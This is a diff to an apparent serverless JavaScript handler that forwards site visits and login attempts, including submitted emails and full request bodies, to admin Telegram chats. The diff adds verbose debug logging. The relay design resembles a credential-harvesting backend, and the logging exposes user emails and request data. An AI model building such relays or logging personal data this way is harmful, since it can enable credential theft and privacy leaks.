@@ -107,8 +107,19 @@ async function sendTelegramMessage(chatId, text, env) {
 
 async function notifyAdmins(text, env) {
   const admins = await getAdminChatIds(env);
+  console.log(`[DEBUG] Found ${admins.length} admin(s):`, admins);
+  console.log(`[DEBUG] ADMIN_CHAT_ID env:`, env.ADMIN_CHAT_ID);
+  
+  if (admins.length === 0) {
+    console.error('[ERROR] No admins configured! Check ADMIN_CHAT_ID variable.');
+    return;
+  }
+  
   for (const chatId of admins) {
-    await sendTelegramMessage(chatId, text, env);
+    console.log(`[DEBUG] Sending to chat_id: ${chatId}`);
+    const resp = await sendTelegramMessage(chatId, text, env);
+    const result = await resp.json().catch(() => ({}));
+    console.log(`[DEBUG] Telegram response for ${chatId}:`, result);
   }
 }
 
@@ -223,27 +234,33 @@ function formatLoginAttemptText(meta, body) {
 }
 
 async function handleVisit(request, env, cors) {
+  console.log('[DEBUG] handleVisit called');
   if (!ensureJsonRequest(request)) {
     return json({ success: false, error: "Unsupported Media Type" }, 415, cors.headers);
   }
   const body = await request.json().catch(() => null);
+  console.log('[DEBUG] Visit body:', body);
   const meta = getClientMeta(request);
   const text = formatVisitText(meta, body || {});
+  console.log('[DEBUG] Formatted text length:', text.length);
   await notifyAdmins(text, env);
   return json({ success: true }, 200, cors.headers);
 }
 
 async function handleLoginAttempt(request, env, cors) {
+  console.log('[DEBUG] handleLoginAttempt called');
   if (!ensureJsonRequest(request)) {
     return json({ success: false, error: "Unsupported Media Type" }, 415, cors.headers);
   }
   const body = await request.json().catch(() => null);
   const email = String(body?.email || "").trim();
+  console.log('[DEBUG] Login attempt email:', email);
   if (!email) {
     return json({ success: false, error: "email is required" }, 400, cors.headers);
   }
   const meta = getClientMeta(request);
   const text = formatLoginAttemptText(meta, body || {});
+  console.log('[DEBUG] Formatted text length:', text.length);
   await notifyAdmins(text, env);
   return json({ success: true }, 200, cors.headers);
 }
